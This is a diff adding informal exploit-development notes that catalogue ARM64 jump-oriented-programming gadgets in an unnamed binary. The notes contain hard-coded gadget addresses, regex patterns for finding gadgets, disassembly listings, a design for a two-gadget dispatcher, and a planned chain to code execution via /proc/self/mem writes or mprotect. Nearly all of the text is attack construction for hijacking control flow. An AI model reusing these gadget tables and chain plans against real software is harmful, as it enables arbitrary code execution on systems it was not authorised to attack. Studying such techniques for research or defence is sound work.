@@ -1,0 +1,207 @@
+First, we try to find an optimal dispatcher gadget:
+/\* add x..?,x..?,#0x[0-9a-z]+; bl?r x..?; \*/
+
+#define JOPPENHEIMER_GADGET_18044 ((uint64_t)0x000b53a4) /* add x8,x27,#0x10; blr x8; */
+#define JOPPENHEIMER_GADGET_30044 ((uint64_t)0x000f7da0) /* add x8,x19,#0x10; blr x8; */
+
+And.... We found nothing, but above are two nice candidates (and there are a few more).
+
+Next, we try to find a one-gadget dispatcher that has a side-effect or two:
+/\* add x..?,x..?,#0x[0-9a-z]+; [^;]+; bl?r x..?; \*/
+
+The above search found too many candidates, so we limit our search to x8:
+/\* add x8,x8,#0x[0-9a-z]+; [^;]+; bl?r x8; \*/
+No good candidates were found.
+
+Next, we try to find a one-gadget dispatcher that uses ldr:
+/\* ldr x..?,\[x..?, #0x[0-9a-z]+\]!; bl?r x8; \*/
+/\* ldr x..?,\[x..?, #0x[0-9a-z]+\]!; [^;]+; bl?r x8; \*/
+
+#define JOPPENHEIMER_GADGET_46778 ((uint64_t)0x00167c1c) /* ldr x8,[x1, #0x8]!; mov x1,x19; blr x8; */
+#define JOPPENHEIMER_GADGET_29288 ((uint64_t)0x000f1950) /* ldr x1,[x22, #0x10]!; mov x23,x0; blr x8; */
+#define JOPPENHEIMER_GADGET_29298 ((uint64_t)0x000f19cc) /* ldr x1,[x22, #0x10]!; mov x23,x0; blr x8; */
+#define JOPPENHEIMER_GADGET_46778 ((uint64_t)0x00167c1c) /* ldr x8,[x1, #0x8]!; mov x1,x19; blr x8; */
+
+Next, we try to find a two-gadget dispatcher (as explained during the CAE Talk: An Introduction to Jump-Oriented Programming: An Alternative Code-Reuse Attack).
+To find the first gadget:
+/\* add x..?,x..?,#0x[0-9a-z]+; bl?r x.; \*/
+#define JOPPENHEIMER_GADGET_30224 ((uint64_t)0x000fac54) /* add x20,x20,#0x38; blr x8; */
+#define JOPPENHEIMER_GADGET_30559 ((uint64_t)0x000fc1c4) /* add x27,x27,#0x1; blr x8; */
+#define JOPPENHEIMER_GADGET_30584 ((uint64_t)0x000fc3b0) /* add x25,x25,#0x1; blr x8; */
+#define JOPPENHEIMER_GADGET_33074 ((uint64_t)0x001107c0) /* add x22,x22,#0x48; blr x8; */
+
+/\* bl?r x8; \*/
+        000b1ee0 09 00 40 f9     ldr        x9,[x0]
+        000b1ee4 01 01 40 ad     ldp        q1,q0,[x8]=>local_48[0]
+        000b1ee8 28 39 42 f9     ldr        x8,[x9, #0x470]
+        000b1eec a1 03 3d ad     stp        q1,q0,[x29, #local_70[0]]
+        000b1ef0 a3 83 01 d1     sub        x3,x29,#0x60
+        000b1ef4 00 01 3f d6     blr        x8
+        
+        
+        000f18c0 08 00 40 f9     ldr        x8,[x0]
+        000f18c4 08 05 40 f9     ldr        x8,[x8, #0x8]
+        000f18c8 00 01 3f d6     blr        x8
+        
+        000f1c60 08 00 40 f9     ldr        x8,[x0]
+        000f1c64 08 09 40 f9     ldr        x8,[x8, #0x10]
+        000f1c68 00 01 3f d6     blr        x8
+        
+        000f308c 20 00 40 f9     ldr        x0,[x1]
+        000f3090 08 00 40 f9     ldr        x8,[x0]
+        000f3094 02 0d 40 f9     ldr        x2,[x8, #0x18]
+        000f3098 40 00 1f d6     br         x2
+        
+        
+        
+ldr +x..?,\[x0.+\n.+ldr +x0,\[x..?
+
+ldr +x0,\[x0.+\n.+ldr +x0,\[x..?
+
+
+Degrees of freedom:
+
+        0012f074 00 00 40 f9     ldr        x0,[x0]
+        0012f078 c0 00 00 b4     cbz        x0,LAB_0012f090
+        0012f07c 08 00 40 f9     ldr        x8,[x0]
+        0012f080 08 0d 40 f9     ldr        x8,[x8, #0x18]
+        0012f084 00 01 3f d6     blr        x8
+        
+        
+The plan is:
+1- Add a degree of freedom
+2- Use a two-gadget dispatcher
+
+
+
+
+
+
+The two gadget JOP dispatcher is:
+1- table_jumper: bl?r x_table_ptr
+2- table_adder:  add x_table_ptr, 0x...; bl?r table_jumper
+
+And all gadgets end with bl?r x_table_adder
+
+
+A very cool alternative is
+1- table_jumper: bl?r x_table_ptr; bl?r x_table_adder
+2- table_adder:  add x_table_ptr, 0x...; bl?r table_jumper
+
+And all gadgets end with ret
+
+
+
+
+        0010607c a8 1e 40 f9     ldr        x8,[x21, #0x38]
+        00106080 b6 42 00 91     add        x22,x21,#0x10
+        00106084 e0 03 16 aa     mov        x0,x22
+        00106088 00 01 3f d6     blr        x8
+        0010608c a8 1e 40 f9     ldr        x8,[x21, #0x38]
+        00106090 e0 03 16 aa     mov        x0,x22
+        00106094 00 01 3f d6     blr        x8
+        00106098 48 0a 00 f0     adrp       x8,0x251000
+        0010609c 89 02 40 f9     ldr        x9,[x20]
+        001060a0 02 7d 42 f9     ldr        x2,[x8, #0x4f8]=>DAT_002514f8                    = ??
+        001060a4 28 b9 41 f9     ldr        x8,[x9, #0x370]
+        001060a8 e0 03 14 aa     mov        x0,x20
+        001060ac e1 03 13 aa     mov        x1,x19
+        001060b0 e3 03 16 aa     mov        x3,x22
+        001060b4 00 01 3f d6     blr        x8
+        001060b8 a8 22 40 f9     ldr        x8,[x21, #0x40]
+        001060bc e0 03 16 aa     mov        x0,x22
+        001060c0 00 01 3f d6     blr        x8
+
+       
+Before gadget:
+1- We control x0
+blr +x..?\n.+\n.+\n.+bl?r
+        00106138 f5 03 00 aa     mov        x21,x0
+        0010613c 95 02 00 b4     cbz        x21,LAB_0010618c
+        00106140 a8 16 40 f9     ldr        x8,[x21, #0x28]    # Here we put anything we want
+        00106144 e0 03 15 aa     mov        x0,x21
+        00106148 00 01 3f d6     blr        x8
+        0010614c a8 1a 40 f9     ldr        x8,[x21, #0x30]    # Here we put our own address
+        00106150 e0 03 15 aa     mov        x0,x21
+        00106154 00 01 3f d6     blr        x8 
+        
+add +x..?,x..?,#.+\n.+\n.+bl?r +x..?
+        000b721c a8 1e 40 f9     ldr        x8,[x21, #0x38]
+        000b7220 b5 42 00 91     add        x21,x21,#0x10
+        000b7224 e0 03 15 aa     mov        x0,x21
+        000b7228 00 01 3f d6     blr        x8
+        000b722c 98 00 00 b4     cbz        x24,LAB_000b723c
+        000b7230 08 1b 40 f9     ldr        x8,[x24, #0x30]
+        000b7234 e0 03 18 aa     mov        x0,x24
+        000b7238 00 01 3f d6     blr        x8
+        
+        
+000b721c a8 1e 40 f9     ldr        x8,[x21, #0x38]
+000b7220 b5 42 00 91     add        x21,x21,#0x10
+000b7224 e0 03 15 aa     mov        x0,x21
+000b7228 00 01 3f d6     blr        x8
+        
+000c5a80 08 1f 40 f9     ldr        x8,[x24, #0x38]
+000c5a84 18 43 00 91     add        x24,x24,#0x10
+000c5a88 e0 03 18 aa     mov        x0,x24
+000c5a8c 00 01 3f d6     blr        x8
+
+001929e4 a0 06 40 a9     ldp        x0,x1,[x21]
+001929e8 08 00 40 f9     ldr        x8,[x0]
+001929ec 08 a9 42 f9     ldr        x8,[x8, #0x550]
+001929f0 00 01 3f d6     blr        x8
+
+DISPATCHER GADGET:
+0010f598 a0 8e 5f f8     ldr        x0,[x21, #-0x8]!
+0010f59c bf 02 00 f9     str        xzr,[x21]
+0010f5a0 80 00 00 b4     cbz        x0,LAB_0010f5b0
+0010f5a4 08 00 40 f9     ldr        x8,[x0]
+0010f5a8 08 05 40 f9     ldr        x8,[x8, #0x8]
+0010f5ac 00 01 3f d6     blr        x8
+        0017c5e0 68 02 40 f9     ldr        x8,[x19]
+        0017c5e4 08 55 40 f9     ldr        x8,[x8, #0xa8]
+        0017c5e8 e1 03 00 aa     mov        x1,x0
+        0017c5ec e0 03 13 aa     mov        x0,x19
+        0017c5f0 00 01 3f d6     blr        x8
+
+This is for setting x1
+    000b1a9c 00 6d 46 f9     ldr        x0,[x8, #offset DAT_00250cd8]                    = ??
+    000b1aa0 08 00 40 f9     ldr        x8,[x0]
+    000b1aa4 01 0d 40 f9     ldr        x1,[x8, #0x18]
+    000b1aa8 20 00 1f d6     br         x1
+
+            001a7c90 f3 03 00 aa     mov        x19,x0
+        001a7c94 73 02 00 b4     cbz        x19,LAB_001a7ce0
+        001a7c98 68 02 40 f9     ldr        x8,[x19]
+        001a7c9c 60 26 40 f9     ldr        x0,[x19, #0x48]
+        001a7ca0 61 0a 40 f9     ldr        x1,[x19, #0x10]
+        001a7ca4 00 01 3f d6     blr        x8
+
+After gadget:
+1- We control x21
+2- We called any two ret or non-ret gadgets
+
+        
+And now these are the chain options:
+1- mmap /proc/self/mem, memcpy to there
+2- open /proc/self/mem, lseek, write
+3- dlsym, mprotect
+
+
+With open you need 
+
+
+Look for table-adder:
+add +x..?,x..?,#.+\n.+bl?r +x..?
+This is a table adder:
+
+001b3ab8 00 21 00 91     add        x0,x8,#0x8
+001b3abc 20 01 3f d6     blr        x9
+
+        001419a8 00 34 40 f9     ldr        x0,[x0, #0x68]
+        001419ac 08 00 40 f9     ldr        x8,[x0]
+        001419b0 08 09 40 f9     ldr        x8,[x8, #0x10]
+        001419b4 42 7c 40 93     sxtw       x2,w2
+        001419b8 00 01 3f d6     blr        x8
+        
+
